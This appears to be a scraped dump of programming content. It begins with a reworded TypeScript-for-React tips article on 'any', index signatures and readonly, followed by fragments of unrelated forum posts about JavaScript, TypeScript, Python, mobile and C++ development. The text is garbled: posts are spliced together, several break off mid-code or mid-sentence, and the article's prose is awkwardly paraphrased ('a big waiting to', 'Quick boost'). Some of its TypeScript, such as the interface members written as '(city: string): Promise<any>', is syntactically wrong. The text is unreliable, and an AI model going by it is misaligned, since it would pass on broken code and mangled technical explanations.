* You can never abuse this method because TypeScript won’t allow you to pass in arguments with wrong shapes.
* Any change to the method definition- possibly index is now a string- and TypeScript will prevent your code from compiling until you fix all the instances where the method was used.

### 2. Stop abusing any-

The type *any* is a fabulous way for you to migrate a current JavaScript project gradually to TypeScript. Why is this? Well, if you type a variable as *any*, you’re advising TypeScript to skip type checking it. You can now assign and reassign various types to this variable. This allows you to select all through kind checking when necessary. While there might be different cases for utilizing *any*, for example, when you’re working with a third party API and you don’t know what will return, it is definitely possible to overuse it and, in effect, neglect the advantages of TypeScript in the process.

Let us see the case where it was definitely abused.

    export interface BudgetRequiredProps {   categoryDetails?: any[];   state?: any;   onInputChange?: (event) =&gt; void;   toggleSubCategory?: (type: any) =&gt; any;   displaySubCategory?: () =&gt; any[]; }

There are appropriate use cases for *any*, yet this isn’t one of them. For example, take a look at line 2, where we’re basically specifying an array  that can hold content of varying types. This is a big waiting to wherever we’re mapping over *categoryDetails*, and we don’t represent the way that it might contain items of different types.

Line 3 is more worse. There is no reason behind why *state*‘s shape should be unknown. This entire interface is essentially doing likewise as vanilla JS with regards to type checking, i.e., literally nothing. This is a terrific case of interface misuse.

Now, we’ve experienced the codebase where this example was chosen from to look at the expected states of the variables, and this is the means by which it should look:

    export interface BudgetRequiredProps {   categoryDetails?: CategoryShape[];   state?: string | null;   onInputChange?: (event: React.FormEvent) =&gt; void;   toggleSubCategory?: (type: string) =&gt; boolean;   displaySubCategory?: () =&gt; CategoryShape[]; }

Much better. You get all the benefits of utilizing TypeScript without changing the interface too much. Now, let us see, where using *any* really makes sense.

    export interface WeatherPageProps {   getCurrentWeatherStatus: (city: string): Promise&lt;any&gt;;   handleUserUpdate: (userContent: any): Promise&lt;any&gt;; }

Why would that be a valid use case for *any*? All things considered, for one, we’re working with an external API. On line 2, we’re specifying a function that makes a fetch request to a weather API, and we don’t know what the response should look like; possibly it’s an endpoint that returns dynamic data based on certain condition. In that case, specifying the return type as an assurance that resolves to *any* is acceptable.

On line 3, we’re also working with a function that takes in a prop that is a dynamic in content. For instance, say *userContent* comes from the user, and we don’t know what the user may type. For this situation, typing userContent as *any* is totally acceptable. Yes, there are valid use cases for the *any* type, but avoid it as much as you can without demolishing the developer experience.

### 3. Remember index signatures-

Presently this is a very subtle mistake we see quite a lot in React code where you may need to map over an object and access its properties dynamically. Consider this example:

    const obj = {   gasoline: 'flammable',   sauce: 'hot',   isTypeScriptCool: true, } Object.keys(obj).forEach(key =&gt; console.log(obj[key])) // 'flammable', 'hot', true

The above example won’t cause an issue with vanilla JavaScript, yet the equivalent isn’t true in TypeScript.

    interface ObjectShape {   gasoline: string;   sauce: string;   isTypeScriptCool: boolean; }   const obj: ObjectShape = {   gasoline: 'flammable',   sauce: 'hot',   isTypeScriptCool: true, }   Object.keys(obj).forEach(key =&gt; console.log(obj[key])) // ❌ you can't just do this

You can not do that because of type indexing. In TypeScript, you have to specify how an interface should be indexed into by giving it an index signature, i.e., a signature that depicts the types we can use to index into the interface, alongside the corresponding return types. Quick boost: indexing into an object looks like *obj\[‘sauce’\]* or *obj.gasoline*.

We didn’t tell to TypeScript what index signature *ObjectShape* should have, so it doesn’t know what to do when you index into an object that implements it like we do on line 13. But, how does this concern React?

All things considered, there are cases where you may need to iterate over a component’s state to get certain values, like so:  


    interface ComponentState {   nameError: string;   ageError: string;   numOfFields: number; }   this.state: ComponentState = {   nameError: 'your name is too awesome',   ageError: 'you seem immortal',   numOfFields: 2, }   Object.keys(this.state).forEach(err =&gt; this.handleError(this.state[err])); 

This is an exceptionally normal activity in React, yet you can see how we may run into an issue on line 13. We’re indexing into *this.state*, yet the interface it implements doesn’t have an index signature. 

But, that isn’t even the mistake I’m discussing, and I’ll get to it in a moment. To fix the warning TypeScript throws, some devs may update the state’s interface like so:

    interface ComponentState {   nameError: string;   ageError: string;   numOfFields: number;   [x: string]: any;  // index signature added }

Before we proceed, it’s significant that, by default, adding an index signature to an interface implies you will have the option to include values that don’t exist in the interface to any variable that implements it. This will effectively get rid of the error, but now you’ve introduced another side effect. This is the same as telling TypeScript that when *ComponentState* is indexed with a string, it should return a value of type any (basically all possible types). This could cause issues if *this.handleError* was not expecting anything apart from a string or a number. But more importantly, you can now be able to include another property with ANY type to whichever variable implements the interface, which, in our case, is *this.state*. So this gets valid:

    this.state['shouldNotBeHere'] = { bugs: 1, dev: 0 }

Now that is the mistake we are discussing. How do we fix it, though? All things considered, there are actually two things we need to look out for:

1. We need to determine all possible index return types in the object, but no more (no *any*)
2. We don’t want to add new values to an object because of indexing.

In many cases, the correct way to fix our initial issue (indexing into an object without TypeScript complaining) is do this:

    interface ComponentState {   nameError: string;   ageError: string;   numOfFields: number;   readonly [x: string]: string | number; }

Alright, so this is what this code is saying:

By simply specifying the index signature return values, we’re able to solve our first issue. And by marking it as read-only, we’re ready to solve the second issue. Keep an eye out for this inconspicuous issue when writing TypeScript code.

## Conclusion-

3628,2020-03-30 15:45:57,0,1,"Discerning between a touch event and mouse event should be trivial.  
However with Typescript, it seems damn near impossible and it really is a black hole of wasted time trying to figure it out.  
  
```javascript 
export function getPageCoordinates(event: React.TouchEvent | React.MouseEvent, index = 0): Point {

    //This wont work because you cant use the ""in"" operator to search.
  if ('changedTouches' in event) {
    const { pageX, pageY } =
      event.touches.length &gt; index - 1
        ? event.touches[index]
        : { pageX: 0, pageY: 0 };
    return [pageX, pageY];
  }

    //This wont work either.
  if (event.type === 'touchstart' || event.type === 'touchmove' || event.type === 'touchend' || event.type === 'touchcancel') {
    const { pageX, pageY } =
      event.touches.length &gt; index - 1

3629,2020-03-31 23:56:37,2,1,"hi guys,

not a tech person whatsoever but work in tech and heavily interested in data visualization, with a focus on aesthetics.

some of the ones I like for javascript are amcharts, d3, chartist.

we work with data in Excel, csv and jason. we work with Illustrator files to visualize the data through manually created designs that are static.

is it possible to take the same designs for a chart, graph or map in Illustrator, save in SVG, convert the code to javascript, and somehow code it or port it to one of those javascript chart libraries? to have an identical design from the static template, but now into some sort of javascript code that can continue to be manipulated, and turned more interactive and animated, and able to have the data updated or parsed in real-time or updated if its source file is updated.

thanks everyone.",[AskJS] Exporting Illustrator designs into SVG for custom javascript charts?

It's mostly scoped for beginners who coded some tests before but wish to sharpen their testing skills.

This is an intimate session with 12 developers only, therefore only 3 seats left. Please feel this form below to register. Want to see some of my videos and content to get confident that you spend your time with the right person? See links below  


Registration: [https://forms.gle/CAAihp7vvv39xDgj8](https://forms.gle/CAAihp7vvv39xDgj8)

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

More details:

Much more than production code, testing code must stay EXTREMELY simple and maintainable. No team may stop writing production code but many abandon their tests due to 'lack of time'. In this session, we will cover how to reach a high level of simplicity and maintainability using JavaScript code examples. In 40 min we will cover 15 fundamental best practices, 10 testing techniques and tools and 10 inspiring quotes from testing literature

For example, this webinar will cover how to structure your tests using the AAA pattern, keeping tests shorts, choose the right amount of assertions, avoid repetition in tests, handling tests exceptions, test linters and much more  


\- When - Monday, April 6th, 11:30 UTC via zoom

\- Prerequisite - This webinar is for developers who already coded at least a few tests before. We're not going to go through 'hello world' testing examples rather assume you know how to write basic testings and focus on taking them a level up

\- Is it just slides or also code? For a start, just a bit of theory and then 80% practical code examples

\- Who are you and why should I watch your webinar? I'm the author of these guides, I urge you to visit and ensure they meet your standard before registering

Basically i want to click the button which opens up another view from the controller, i have the  controller method set to ""Details"" with a return of ""View()"" which should open the Details.cshtml.   


Im not sure if i am going the right route or if there is another method to utilize in the button or the method in the controller needs to be set differently. 

jscript function  
 `&lt;script type=""text/javascript""&gt;`  
`$(function () {`

so in typescript, once we define an object like this

const parsedData = {

            stops,

            specialRequests,

```
Then we cannot dynamically add more fields like javascript
```
// error 
if (isPreOrder) {
       parsedData.scheduleAt = new Date(pickup.startAt).toISOString();
}
```
Nor we can add dummy field just letting typescript know we have this field
```
const parsedData = {
            scheduleAt : undefined  // error
            serviceType,
            stops,

First things first, I know I need to work on making this PEP compliant. Also, I realized into making this that I could be a lot more efficient in the way some things are done. I think this is referred to as the ""algorithm"" of the program, right? For example, I at times convert things to strings, then interfaces, then back to networks and I think there are some classes/functions that can do what I wanted with less steps.

This is product of my first serious studies into python. I am a network engineer by trade right now, and I'm looking for how to combine software engineering/python with my love for networking to future proof my self and increase the ol' paycheck.

&amp;#x200B;

Any advice based on what you see? How can I pair python with networking further? One thing I think I should look into is maybe sockets...I would like to create an encrypted messaging application. Just to do it...

But what should I do to get better at this? Just keep studying python fundamentals? There are some things I need to fix in this game, for instance never present a ""0"" IP ex: [0.243.123.123](https://0.243.123.123), also prevent anything starting with 127.x.x.x and class d/e IP addresses. Seems like it could be done with a simple if after generation of the ""random"" IP....kind of bored with this project already. However, what would be the best way to implement this game in a browser? Would Django work for that, or would I have to convert the python to javascript?

I guess I'm looking for advice on how to improve and pair python with networking, based on what you see from my first real python project. This is made after the first module or two of a pluralsight course.",IP Networking: Subnet Text Based Game

I'm reasonably comfortable with coding (javascript/C#) but have never done anything with Swift or developed anything on iOS/MacOS. Now trying to dip my toes into these waters and just reading up swift. A lot of things are still unclear and XCode feels much harder than VS Code - but it's a matter of getting used to I guess.

I want to develop a fairly straightforward MacOS desktop app. The app would have a left pane to show some folders and files, and when they click a file, the right pane would show some stuff after text processing the file. It's nothing terribly fancy, but will need some solid file management, text/regex processing, a good settings screen with lots of options, and then run a console/terminal program.

I'm hoping to learn from a reasonably simple desktop app sample project but don't know which one would be good - there's a lot of iOS or really complicated apps not good for a total n00b.

Are there are any good sample projects for MacOS with some characteristics of the above, and any good video tutorials? At this point, I don't even know how to connect the UI to the code... so I'm really that early. I am reading a ton - there's just a lot.

So I'm making a typescript module that will be used by other project (ts and js). And **I CANNOT** make the declaration file work the way it is supposed to.

My module is made out of 3 files :

```
- mainClass.ts
- otherClass.ts
- types.d.ts
```
All my types are generated in the `types.d.ts` like this at top level.
```javascript
export type mainClassConstructor = new (
  config: Config,
) =&gt; void

export interface mainClassInterface {
  config: Config
  getIndex(indexUid: string): Index
  ...
}
```

in my `mainClass.ts` which is the entry point of my module my class is like this: 
```javascript

const mainClass: Types.mainClassConstructor = class implements Types.mainClassInterface {
  config: Types.Config
  constructor(config: Types.Config) {
    this.config = config
  }
  getIndex(indexUid: string): Index {
     return new Index(indexUid);
  }
}
```

Now, when I add this module to another typescript project using `types.d.ts` as typing in `package.json`. Upon creating my first object I receive this error:

&gt; Type 'typeof import(""/mymodule-js/src/types"")' has no construct signatures.  TS2351

    		document.getElementById(""displayName"").innerHTML = name;

About theses simple methods, we could take two points:

\- All those methods don't need the parenthesis (because they have just one parameter)

\- We could remove all those curly braces, although it would have a return

&amp;#x200B;

**So I started thinking, there's any common sense in the community about the way we write arrow functions?**

&amp;#x200B;

As for me, I personally use the parenthesis only when really necessary, and if the content is small like a single method I don't use curly braces, even if I don't care about the return.

Something like:

    const logWarning = message =&gt; console.warn(message); // the return of console.warn doesn't matter
    
    const firstOrDefault = (arr, defaultValue) =&gt; arr.length &gt; 0 ? arr[0] : defaultValue; // normal function","[AskJS] How is the community's preferable way of using arrow functions, concerning parenthesis and curly braces?"

Scenario:  Boss calls you after he clicked on a link an email that he now admits was a phishing email. He luckily didn't enter his user/password, but he did visit the page.  So the question is, how do you ""visit"" the webpage, to see how bad it is, in a safe manner? 

I was thinking about my first attempt would be to use python to download the actual URL and save it as a PDF.  The theory is, since I'm not hitting it from, say, Chrome, I might not be running some malicious javascript. 

I have this simple python script that does pull down a PDF and converts it to a PDF on your computer. 

    import pdfkit
    pdfkit.from_url('http://url_to_checkout.com','webpage_as_PDF.pdf') 

Would accessing a URL via python and something like pdfkit be a 'safe' way to start checking out a webpage that is probably bad?  

&amp;#x200B;

What's a safe way to download the actual source code of a page, without actually running javascript/potential other bad files?   I thought the output should save it as a PDF or TXT so it wouldn't ""contact homebase"" in a sense.

3739,2020-05-07 13:33:07,1,1," So like many others, I once often found developers who shared their stories to be inspiring and help motivate me to work on my own projects. So I figured I'd share how I went from Graduating in Business Administration, to becoming a self-taught full stack web developer who launched his own platform with full-stack javascript.

During college I was always interested in developing my own businesses/projects, but software engineering/computer science just seemed like out of the realm of possibility. By the time I graduated, I realized that I definitely wanted to launch my own business, and that the best way to do so would be to build my own tools/services/products that could actually help people. So, I started to learn HTML5 and CSS3. I had worked on different platforms/sites throughout the past (WordPress, Joomla, phpBB, vBulletin, etc.), using built-in tools to edit and modify things, but developing something from the ground up was new to me.

So I started my journey of learning HTML and CSS by watching tutorials and taking some courses on Udemy. By the time I finished the first course, I figured I'd start applying to freelance jobs and landed my first contract. After completing the first freelancer gig, I realized I wanted to take this more seriously, and I soon realized how if I pursued it... I could build the tools and features that people really need in their lives.

So, I tried to figure out if I should learn Python or JavaScript. I kept flip-flopping between the two. I got about 13 hours into a Python Course and I was still doing basic things like adding items to a list or removing them from a list. It was incredibly frustrating because I ""wanted to build things that I could actually see"". So I switched to JavaScript. I took a 46 hour course on Udemy, took over 60 pages of notes... and then got to the end of the course and panicked because I felt like I didn't LEARN anything. So I stopped. I felt like programming was out of my wheelhouse and I wouldn't be able to do anything with it.

Several months went by and I signed up for Treehouse. I had heard good things about it and I liked how they would reinforce learning through projects and quizzes. So I signed up and made a plan to take at least an hour or two hour each day to complete lessons/courses, and take notes at the same time. While taking the notes, I also made sure to reinforce how I could USE the examples/things I was learning in the video in real world scenarios. This parallel helped me remember things a little bit more because I would run scenarios in my head about things I could do now - which also helped motivate me to continue the class/videos.

After completing Treehouse, the next thing was to start building a project to reinforce and tie everything together. So... when I was in school taking Entrepreneurship classes, one of the things we were constantly told when looking to start our own business was to solve pain points. Solve problems that people had. So... I looked to myself for inspiration.

Like many of the millions around the world who are now faced with unemployment and beginning their job search once again (or for the first time during these difficult times), I struggled in my own job search years ago. I would submit my resume to employers, forward it to recruiters, attach it to job applications or job postings, and then.... I wouldn't hear back. So, I did my research like everyone always says and the two most common answers I could find and relied upon were, ""It's a numbers game,"" and ""It takes time. Job postings can be open for a month or longer before they start to review candidates.""

Well, I continued to be patient and continued to submit my resume and applications to dozens of other jobs. When it got close to the hundred mark, I began to grow frustrated. Questions began to creep in like, ""Is there something wrong with my resume?"", ""Am I including the right sections on my resume?"", ""Is it formatted properly?"", ""Is there something I can do to stand out more?""

As I began to take a deep dive in figuring out ways to improve my resume and increase my chances of securing a job interview, I soon realized that it appeared to be a common problem for many job seekers and professionals. So, several years later, I decided to build a platform from the ground up that would help job seekers and professionals identify weaknesses within their resume and give them the tools they need to build and perfect their resume on [ResumeCompass](https://www.resumecompass.co/). On ResumeCompass, we provide the most comprehensive free resume review which evaluates your resume against over 45 metrics, and a free resume builder with over 285 resume templates to choose from.

Take a look at our [Product Hunt Launch](https://www.producthunt.com/posts/resumecompass) as well!

I built the platform using the MERN Stack (MongoDB, Express, React, and Node). And I can honestly say that my journey to continue learning hasn't stopped and it can't stop in this industry.

But hopefully, you can take something from my story and the key points which are: 1.) True learning requires dedication and a desire to increase that knowledge if only for a couple of minutes each day, 2.) Stopping and starting is fine (taking a break), as long as it's just a break and you continue on your journey, 3.) It's just that... a journey. You shouldn't expect to wake up tomorrow and know everything there is to do in the industry. We're all in different stages of our programming/developer journey, and it's ok to feel like you're so far behind, and 4.) (MOST IMPORTANTLY), You can do it! There are tens to hundreds of thousands of developers who were exactly where you are now (or even less experienced), and they were able to do it as well.

Remember, every step forward is progress, even if it takes two steps back for you to realize you need to re-assess the next jump forward.

I'd be happy to answer any questions any of you might have regarding my dev journey, how I built my platform that I just launched, or any other questions you might have. Thanks for taking the time to read my story, and we're all rooting you on!",From Complete Noob to Building a Platform w/ JavaScript - My Story

3751,2020-05-11 12:38:11,1,1,"Should I be bothering in writing a loop in JS or is it simply not technically possible?

Here is something I quickly whipped up to show what I want to do: https://jsbin.com/cuvanipumu/edit?js,output. It's a generic gameloop where I have a tick-amount checker which (ideally) triggers something to happen every time the amount of passed ticks is divisible by 2. I'll write the relevant part here (`eventCount` is a number starting at 0):

    if (ticksFixed % 2 === 0) {
      trigger = true;
    }

    if (trigger) {
      eventCount++;
      const d = document.createElement('div');
      d.textContent = eventCount;
      document.getElementById('trigger-display').appendChild(d)
      trigger = false;
    }

In use the `ticksFixed` variable (which is `ticks.toFixed()`), the 'event' runs 30 times at first and then 60 times every 2 real-world seconds. If I don't use `ticks.toFixed()`, the 'event' does not run at all, which I assume is because `ticks` is a value divisible by 2 for less than a microsecond. In an ideal scenario, what I would like to see is `eventCount` being appended onto the page so that there is '0' at start, then '1' appears after it 2 seconds later and so on. So how do I implement event-checking in this game loop (if it is even technically feasible in JS)? Thanks in advance /r/javascript.",Writing a game loop in JS -- is there any possible way to only trigger something *once* and not 30 times in one second?
3752,2020-05-11 12:48:23,15,1,"I started with c and c++ which is the foundation for Java as far as i know  
And then when i realized how potential java is i literally couldn't get to grasp why would anyone choose anything over java, i mean think of it!!!!

Java is very popular and job rich, it can get you to web apps , software apps, and enterprise apps?that's a first star!  
Java has built-in UI ayee interesting part of programming, another star!  
Java is Android, WOWWW such a big and promising field that will stay for a loonngg time, plus it's so freaking cool to create apps???Another star!  
Java is a lot like c and c# so that means......GAME DEVELOPMENT and Embedded Systems??????Another star jesus!!!  
It has Database support, it's based on the most common languages, the networking part is also here, crossplatform too!!!

So Java must be like the All In One super tech tool right??  
You can learn java and have the required foundation for so many tech fields.

3759,2020-05-15 14:01:57,4,0,"So I want to write a node js module in javascript that looks something like this :

    //myModule.js 
    const foo = function (aBigObject) {
    	[
    		function fn1(_) {/*lots of code*/},
    		function fn2(_) {/*lots of code*/},
    		/*a lot of other functions*/
    	].forEach(fn =&gt; fn(aBigObject))
    }

I created a file `myModule.d.ts` in the same folder that `myModule.js` is located , and declared the appropriates types in it .

Now when I import `foo` in some other project I have intellisense for its parameters .

My issues is that when I try to edit something in `myModule.js` I do not have the very much needed intellisense for `aBigObject`. So in `myModule.js` file I use a JSDoc comment and import the types from the file `myModule.d.ts`.

1)Why do I have to do that manually via a JSDoc comment and vscode does not understand automatically the type?

Another issue that I face is that there are internal types that are needed in `myModules.js` while I develop it .They are imported via JSDoc comments. They really make developing way much easier . Nobody will have a need to use these internal types except for me that I develop `myModule.js` .

2)The question is , where do I put the internal types and why? Till so far I have them in file `myModule.d.ts`. Would it be wise to create a separate file for them , e.g. `myModules.internals.d.ts`?

I am not into going full ts and then compiling it to js and d.ts (and to be honest I do not even know how to do it) . I am just not into compiling .",Importing typescript types in js files . How to organize the type files?

I took a refresher and I learnt JavaScript and Angular recently. I now have been tasked to build a website which has a listings module, a payment module and an automated email/text module among others.

I was thinking of doing this using ready-made HTML/CSS templates, just enough javascript for validation/basic stuff and doing everything else via REST API calls and use springboot to do this + any NoSQL database. I shouldn't have much of an issue coding anything in Java, so this project looks smooth sailing. So, my stack of choice would be:

Frontend: JavaScript, HTML, CSS

BackEnd: Spring Boot/REST APIs in Java + any NoSQL database

However, I have a few doubts on my mind and would love some help:

1.) While it looks perfectly plausible to me to develop an application using the stack above, I did not find any courses where people were teaching this. For ""full stack"", I either only see MERN, MEAN stacks or the ones that use Python/PHP. Why is this so? Am I living under a rock?

2.) Hosting: I only need a Tomcat + server to host my DB. Are hosting platforms good to go for Java based stuff these days? Anyone recommend a platform?

3.) Frankly, I don't see a need to learn Node.js or Python if I only want to develop websites like the ones I outlined above. These are good for other stuff, but for only the projects under discussion, I do not see a need? Am I missing something here?

And finally, as someone who wants to be a full stack developer, what would this community recommend I learn as a Java Developer? What is the ideal stack for a developer with Java background ?

so most important thing is to find a site that shows what this thing does to learn it

&amp;#x200B;

""Programming is not really defined in the way you describe it. Namely, you describe functions as *actions* and arguments as *adjustments*. Sure, that’s a decent analogy. But you need to then comprehend how to actually write those functions (or actions as you describe them) to manipulate a *data structure*.

This is the key piece you are missing. You have to have data stored somewhere, and it has to have the correct *structure* for the data you want it to hold. And those actions need to change that data in a well-defined way so that the state of program can progress. You are calling functions on premade objects which is all well and good, but you need to understand how to make data structures, operate on them, and interpret them so that you can begin to write actual programs.

This is going to be very condensed and simplified, but in essence, you:

1. Start your program
2. Make your data structures to hold any data
3. Initialize them with the starting data they need (or they might not need any initialization at all).
4. Enter into the part of your program that does something with that data (actions and adjustments).
5. Exit out of the part that did something with that data
6. And either exit the program, or read the data and figure out what to do next to it
7. if you need to do more things to the data after reading it, do it

Here’s a good medium article [about different types of data structures and how to use them.](https://medium.com/swlh/introduction-to-data-structures-9134b7d064a6) But it might be a bit high level for you. Best is to take an intro course or typescript or python and learn them gradually. But don’t give up, people tend to hit a wall when “hard” stuff like this pops up in programming. But honestly, it isn’t hard once you get the hang of how it works. Best of luck.""

**#2 random links to learn ts / js - no idea which is ACTUALLY for beginniners, ill test all the js ones**

 

First of all, TypeScript is a typed superset of JavaScript. So, you need to understand JavaScript/ECMAScript first.Few resource to learn:

* [A re-introduction to JavaScript (JS tutorial)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/A_re-introduction_to_JavaScript)
* [The Modern JavaScript Tutorial](https://javascript.info/)
* [33 Concepts Every JavaScript Developer Should Know](https://github.com/leonardomso/33-js-concepts/)
* [Modern JavaScript Cheatsheet](https://github.com/mbeaudru/modern-js-cheatsheet)
* [Clean code JavaScript](https://github.com/ryanmcdermott/clean-code-javascript)

And after that, you can go with TS:

* [Official TypeScript docs](https://www.typescriptlang.org/docs/home)
* [TypeScript Cheatsheet](https://github.com/rmolinamir/typescript-cheatsheet)

&amp;#x200B;

&amp;#x200B;

**original question**

as this is liekly the most common question asked over time

im guessing some of the very knowledgable ppl here had sometimes during the past created a script in which other ppl would just copy / paste to new ppl that ask this question (since you're coders and would want to automate things so they can be made efficient &amp; effective)

&amp;#x200B;

&amp;#x200B;

**if coding was designed well, then it would be quick + easy to learn, just lilke hopscotch or walking**

'have quite a way to go ' - so is it cos coding is not at the state of progress where it could be easiely and quickly learned? kinda like how some things can be quickly and easiely learned, like hopscotch or walking (for example many or even every single thing is that designed well is easy to learn, but things that are not, are not easy to learn but hard)

i also asked if coding was not at the state of progress where it would be easy and quick  to learn (which it can if it was designed well which you didnt consider). you didnt consider the things taht are easy and quick to learn (especially when there are good sites / resources for new ppl)

&amp;#x200B;

&amp;#x200B;

**anything about 'enterpries' doesnt matter**

'why such and such language is an ""enterprise"" language will *fly* over your head at the moment, don't even read them, forget about them.'

it seems like typescript is mainly for 'enterprise use' and for 'angular'  [https://www.quora.com/Should-I-learn-JavaScript-before-learning-TypeScript](https://www.quora.com/Should-I-learn-JavaScript-before-learning-TypeScript) so maybe should learn something simpler but it doesnt seem like there are any simpler options out there...

&amp;#x200B;

**good learning sites are hard to find**

there are no beginning resources on r/reddit, for example the helpful thing i used to learn 'codecombat', its not even on there etc",#1 thing of coding is 'data structures' - everything learned about the first steps in learning typescript (and any other coding languages)

But, sadly it's in Elixir (Erlang).

**I wonder if there are similar implementations in JavaScript (TypeScript) and Node.JS (Deno.TS)?**

# Details, if you are interested how it simplifies web development

**Please note:** it's not about progressive loading, first page load speedup, server-side React.JS rendering etc.

What this approach does - **eliminates the Client-Side, totally**. There's no JS application code written and running in the browser (Browser has only tiny supporting JS library code). 

And it **does that efficiently** - react-like things runs on server and it does it with **low latency, low server load, low network traffic** so the user experience is fluid and feels really good (if you interested please search how Phoenix LiveView Diff algorithm works, it could be done in JS-land too).

And, eliminating the ClientSide it also eliminates:

- REST API, GraphQL, and so on. No need to write it.
- There's no Client Storage or DB slice / cache.
- There's no Client Data Models.
- There's no Client Form Validations - forms will be same fluid and responsive even if in reality it will be validated on the server.
- Client State, things like Redux, etc.
- Server subscriptions, Server Push etc. - no need, UI will be updated for you as if by majic.
- N+1 client query problem - no more.
- Slow initial page load - no more, there's no JS, first page load will be blazing fast.
- Great for SEO - again, no need to bother with server rendering etc.
- No Build tools like Babel, WebPack etc, as there's no Client JS.

Limitations:

There are limitations of course, as I mentioned - it's unbelievably efficient, see the details of LiveView diff and state management algorithms. But, things like very high-action games or extremely high frequency inputs may be not the best fit for it. For me it probably would be fine for 95% of all my Web Work.","[AskJS] Server-Side React.JS like Web Framework, the Real Framework, not Server-Side Rendering etc."

Quick backstory: I've always wanted to create a different kind of code editor that encompasses several aspects of what I consider programming. I think it's started somewhere around the time Bret Victor had his famous talk - it blew my mind, seeing how he develops the game in real-time modifying variable and functions as he goes.

&amp;#x200B;

![video](v3mhxepv7y151 ""djit.su showing off the spreadsheet capabilities with React components"")

About three months ago, as the corona lockdowns hit, the company I just recently started working at collapsed due to lack of funding. I was out of a job in the very first weeks of the lockdowns. I just recently got into the job, around January, so the process of job hunting was still in memory, and I rebooted that after a couple of weeks when it was 100% certain that the company isn't coming back from the dead.

Even before that, I started working on \*a thing\*. It began when I finished with my [ObservableHQ Coronavirus Stats](https://observablehq.com/@elisk/coronavirus-stats) and wanted to extend the table with more features.

Long story short, I developed [djit](https://github.com/elis/djit) — a spreadsheet engine with a slight favour towards javascript functionality, after realising that there's something interesting in how we interact with spreadsheets. I somehow stumbled upon the shtick that my code editor needed. When I first prototyped the concept on ObservableHQ it was insane — it felt like I was Neo when he finished the Kong Fu simulation.

To understand what I mean you really need to just play around with it - there's something in the immediate responsivity of your code and how having your code accessible from a spreadsheet and having access back to the spreadsheet - it's kind of weird, kind of awesome. 

  


![video](w6361msf7y151 ""djit.su demonstrating live `demo code` to quickly code and prototype with immediate feedback"")

Today, a Saturday, while here in Israel the lockdowns are slowly lifting, and I'm enjoying my weekend after a eventful week at my new job, I finally shipped what I consider truly functional version of [djit.su](https://djit.su) — a rudimentary yet-to-be-fully-defined tool that I \*designed\* in my mind for almost a decade, prototyped at least four different times in the last five years, and finally get to play with for the first time after building it for the past 3 months.

I've created a quick reference example for how to update the cell value from the react component - check it out here: [https://djit.su/dBqYwddyuP42QRe](https://djit.su/dBqYwddyuP42QRe) — it might serve you as a good point to get an idea how to interact with [djit.su](https://djit.su) as the documentation is non-existing at this point.

I have created what is essentially a random story generator. The program asks some questions and randomly chooses items from text documents as appropriate in order to generate a narrative. This is sort of similar to a text adventure game but with a pseudo-procedural generation aspect. Of course, this whole game runs in the command line and I like that feel.

It doesn't show anything about passing through the ID or secret key.

&amp;#x200B;

How are they allowing that POST through without the authentications?

&amp;#x200B;

I assume they are allowing this because creating the Order isn't too important when it comes to security.  They then require the returned Order token for the redirecT:  [https://developers.afterpay.com/afterpay-online/reference#javascript-afterpayjs](https://developers.afterpay.com/afterpay-online/reference#javascript-afterpayjs)

I'm here looking for some advices. Lately I've got interested in GUI and mobile dev, expecially on Android. I started to code in Python for scientific and math usage but now I really got into programming and I wanted to develop a small app for my smartphone. I tried with Python libraries like Kivy and QtPy but it seems I can't get a nice result. It always feels that the app is old or crunchy or not...nice enough.

Recently I've used an app written in Kotlin and It felt like a really good one, runs smooth and was pretty nice to use. 

I thought ""I could program for a hundred years in Kivy but I'll never get this result"".

So I am willing to move to Kotlin, for now for Android programming at least.

The big problem is I have 0 knoledge about Java, javascript and JVM. I never had to aproach them, because the compilation in Python is done by some libraries called ""buildozer"", I just had to install JDK and SDK... so now I feel like I have this big black hole in my head with ""Java"" written on it. 

So now that you know my goal, can you guys suggest me something to start with?

A course, a book or some documentation could be great, but I'd like to know what I am actually doing. For example, I tried to look for the documentation on Intellij IDE website and it's great that they teach you to write ""Hello world"" and other simple stuff in Kotlin. But I don't know how and from which interpreter the file I've written gets compiled, for example. I'd really like to know what's happening, t have a full vision of the environment (if it's possible of course).

3861,2020-06-19 00:51:44,56,1,"Howdy.  Coming to C++ from the Javascript/Typescript world, with a little dabbling in Java, C, and Rust (though JS/TS is my main language). 

The instructor on the Udemy course I'm taking recommends creating seperate .h and .cpp files for classes. The header contains the class definitions and declarations, while the .cpp file contains the methods. 

But I'm a little worried about this when C++ classes aren't like Java classes, in that the values can be referenced *by name* outside of the expected scope. 

What I'm concerned about is that balance is... just kinda sitting there.  It's 
So for example: 


```c++
/* Account.h */
#ifndef _ACCOUNT_H_
#define _ACCOUNT_H_
#include &lt;iostream&gt;
using namespace std;

class Account {
 private:
  double balance{0.0}; // &lt;-- balance is declared here. 

 public:
  // methods
  void set_balance(double bal);
  double get_balance();
};

#endif
```

but in a seperate file:

```c++
/* Account.cpp */
#include ""Account.h""
#include &lt;iostream&gt;
using namespace std;

// methods
void Account::set_balance(double bal) {
  balance = bal; // &lt;-- this line here is worrying me
};
double Account::get_balance() {
  return balance; // &lt;-- same here.
};
```

Wouldn't it make it much easier to read if have everything in the Account.h file? That is - if you're a programmer looking at Account.cpp, and you see ""balance"" in the set_balance method, then the first thing you're going to think of is: ""If that's not defined in this scope, what scope is it defined in?  The *scope* exists in a *completely different file.*

I've rarely seen this happen in the JS world; where we do use class definitions, we tend to keep them all in the same place - properties, methods, &amp; constructors all in the same file. But *even if* we split defining class definitions and method definitions into different files, we have a variable name defined in our import statement. And when we're working with the properties of the values, such as balance, we use 'this' to note that balance is a property of the class.  


```javascript
import Account from './Account'; 

Account.prototype.setBalance = function(balanceValue){
  this.balance = balanceValue;
}
```

Am I wrong or does this seem like a really weird convention?",A little confused about .h/.cpp seperation (style)

Hello all.  I have a rather 'related' topic but not necessarily python - of course the answer could be python (plotly, matplotlib, etc)...

Anyway, long story short.  I'm a data person.  It's what I do at work - 95% of my codebase is written in python.  SQL queries (pyodbc), data crunching, data collection.  We ingest and process hundreds of gigs of data per day (I work in cybersecurity).  Needless to say, all of this data is relatively useless without being able to display it nicely in an app.  For this purpose, at work, we use Splunk - and those front end pages are written in xml.

